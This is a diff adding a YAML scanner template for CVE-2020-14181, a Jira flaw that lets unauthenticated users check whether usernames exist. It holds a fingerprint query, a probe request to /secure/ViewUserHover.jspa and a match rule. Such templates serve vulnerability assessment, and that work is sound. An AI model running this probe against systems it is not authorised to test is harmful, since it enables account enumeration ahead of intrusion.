@@ -1,0 +1,21 @@
+name: Atlassian Jira user information disclosure (CVE-2020-14181)
+manual: true
+query: (app="JIRA" || title="System Dashboard")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /secure/ViewUserHover.jspa?username=peiqipeiqipeiqi
+    expression: response.status == 200 && response.body.bcontains(b"peiqipeiqipeiqi")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: There is an unauthorized access vulnerability in JIRA. Unauthorized
+    users can directly query the existence of a user name through an API interface.
+    This interface is different from cve-2019-8446 and cve-2019-3403. It is a new
+    interface. If JIRA is exposed to the public network, unauthorized users can directly
+    access the interface
+  tags: Disclosure of Sensitive Information
